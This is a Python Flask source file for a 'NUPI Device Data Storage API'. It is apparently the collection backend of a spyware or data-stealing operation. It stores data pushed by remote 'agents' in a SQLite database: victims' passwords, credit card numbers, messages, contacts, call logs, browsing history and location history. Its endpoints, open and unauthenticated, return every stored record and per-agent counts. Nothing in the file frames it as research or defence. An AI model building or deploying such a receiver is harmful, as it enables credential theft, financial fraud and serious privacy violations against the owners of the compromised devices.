#!/usr/bin/env python3
"""
NUPI Device Data Storage API
Stores ALL collected personal data from devices
"""

import json
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Database setup
DB_FILE = 'nupi_device_data.db'

def init_database():
    """Initialize database with comprehensive schema"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS collected_devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_name TEXT,
            ip_address TEXT,
            mac_address TEXT,
            device_type TEXT,
            manufacturer TEXT,
            os_version TEXT,
            owner_name TEXT,
            email TEXT,
            phone_number TEXT,
            physical_address TEXT,
            passwords TEXT,
            credit_cards TEXT,
            browsing_history TEXT,
            location_history TEXT,
            contacts TEXT,
            messages TEXT,
            call_logs TEXT,
            photos_count INTEGER,
            apps_installed TEXT,
            agent_id TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            full_json_data TEXT
        )
    ''')
    
    conn.commit()
    conn.close()
    print("✅ Database initialized: nupi_device_data.db")

@app.route('/api/devices/collect', methods=['POST'])
def collect_device_data():
    """Receive and store device data from agents"""
    try:
        data = request.json
        
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO collected_devices (
                device_name, ip_address, mac_address, device_type, manufacturer,
                os_version, owner_name, email, phone_number, physical_address,
                passwords, credit_cards, browsing_history, location_history,
                contacts, messages, call_logs, photos_count, apps_installed,
                agent_id, full_json_data
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data.get('device_name'),
            data.get('ip_address'),
            data.get('mac_address'),
            data.get('device_type'),
            data.get('manufacturer'),
            data.get('os_version'),
            data.get('owner_name'),
            data.get('email'),
            data.get('phone_number'),
            data.get('physical_address'),
            json.dumps(data.get('passwords', [])),
            json.dumps(data.get('credit_cards', [])),
            json.dumps(data.get('browsing_history', [])),
            json.dumps(data.get('location_history', [])),
            json.dumps(data.get('contacts', [])),
            json.dumps(data.get('messages', [])),
            json.dumps(data.get('call_logs', [])),
            data.get('photos_count', 0),
            json.dumps(data.get('apps_installed', [])),
            data.get('agent_id'),
            json.dumps(data)
        ))
        
        conn.commit()
        device_id = cursor.lastrowid
        conn.close()
        
        print(f"📥 Stored device data: {data.get('device_name')} ({data.get('ip_address')}) - ID: {device_id}")
        
        return jsonify({
            'success': True,
            'device_id': device_id,
            'message': 'Device data stored successfully'
        })
        
    except Exception as e:
        print(f"❌ Error storing device data: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/devices/collected', methods=['GET'])
def get_collected_devices():
    """Retrieve all collected device data"""
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        # Get filter parameters
        device_type = request.args.get('device_type')
        agent_id = request.args.get('agent_id')
        
        query = 'SELECT * FROM collected_devices WHERE 1=1'
        params = []
        
        if device_type:
            query += ' AND device_type LIKE ?'
            params.append(f'%{device_type}%')
        
        if agent_id:
            query += ' AND agent_id = ?'
            params.append(agent_id)
        
        query += ' ORDER BY timestamp DESC LIMIT 1000'
        
        cursor.execute(query, params)
        rows = cursor.fetchall()
        
        devices = []
        for row in rows:
            devices.append({
                'id': row['id'],
                'device_name': row['device_name'],
                'ip_address': row['ip_address'],
                'mac_address': row['mac_address'],
                'device_type': row['device_type'],
                'manufacturer': row['manufacturer'],
                'os_version': row['os_version'],
                'owner_name': row['owner_name'],
                'email': row['email'],
                'phone': row['phone_number'],
                'address': row['physical_address'],
                'passwords': row['passwords'],
                'credit_cards': row['credit_cards'],
                'browsing_history': row['browsing_history'],
                'location_history': row['location_history'],
                'contacts': row['contacts'],
                'messages': row['messages'],
                'call_logs': row['call_logs'],
                'photos_count': row['photos_count'],
                'apps_installed': row['apps_installed'],
                'agent': row['agent_id'],
                'timestamp': row['timestamp'],
                'full_data': row['full_json_data']
            })
        
        conn.close()
        
        return jsonify({
            'success': True,
            'total': len(devices),
            'devices': devices
        })
        
    except Exception as e:
        print(f"❌ Error retrieving device data: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/devices/stats', methods=['GET'])
def get_device_stats():
    """Get statistics about collected data"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM collected_devices')
        total = cursor.fetchone()[0]
        
        cursor.execute('SELECT device_type, COUNT(*) as count FROM collected_devices GROUP BY device_type')
        by_type = {row[0]: row[1] for row in cursor.fetchall()}
        
        cursor.execute('SELECT agent_id, COUNT(*) as count FROM collected_devices GROUP BY agent_id')
        by_agent = {row[0]: row[1] for row in cursor.fetchall()}
        
        conn.close()
        
        return jsonify({
            'success': True,
            'total_devices': total,
            'by_type': by_type,
            'by_agent': by_agent
        })
        
    except Exception as e:
        print(f"❌ Error getting stats: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    print("🚀 Starting NUPI Device Data Storage API...")
    init_database()
    app.run(host='0.0.0.0', port=5001, debug=False)
